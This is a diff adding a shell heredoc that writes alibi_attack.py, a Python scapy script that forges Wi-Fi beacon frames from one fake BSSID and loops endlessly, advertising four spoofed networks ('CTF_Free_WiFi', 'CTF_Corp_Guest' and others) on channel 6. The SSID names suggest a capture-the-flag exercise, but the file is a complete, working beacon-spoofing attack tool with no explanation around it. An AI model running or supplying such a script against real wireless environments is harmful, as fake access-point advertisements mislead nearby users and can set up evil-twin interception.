@@ -1,0 +1,41 @@
+cat > alibi_attack.py << 'EOF'
+#!/usr/bin/env python3
+from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
+import time
+
+IFACE = "wlan0mon"
+CHANNEL = 6
+
+LIAR_BSSID = "DE:AD:BE:EF:00:01"
+LIAR_SSIDS = ["CTF_Free_WiFi", "CTF_Corp_Guest", "CTF_Airport_WiFi", "CTF_Hotel_Lobby"]
+
+def build_beacon(bssid, ssid, seq, channel):
+    dot11 = Dot11(
+        type=0, subtype=8,
+        addr1="ff:ff:ff:ff:ff:ff",
+        addr2=bssid,
+        addr3=bssid,
+        SC=seq << 4
+    )
+    beacon = Dot11Beacon(cap="ESS+privacy")
+    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+    rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x24\x30\x48\x6c")
+    dsset = Dot11Elt(ID="DSset", info=chr(channel).encode())
+    return RadioTap()/dot11/beacon/essid/rates/dsset
+
+def main():
+    seq = 0
+    print(f"[*] LIAR BSSID {LIAR_BSSID} broadcasting {len(LIAR_SSIDS)} SSIDs on ch {CHANNEL}")
+    try:
+        while True:
+            for ssid in LIAR_SSIDS:
+                pkt = build_beacon(LIAR_BSSID, ssid, seq, CHANNEL)
+                sendp(pkt, iface=IFACE, verbose=False)
+                seq = (seq + 1) % 4096
+            time.sleep(0.2)
+    except KeyboardInterrupt:
+        print("\n[*] Stopped.")
+
+if __name__ == "__main__":
+    main()
+EOF
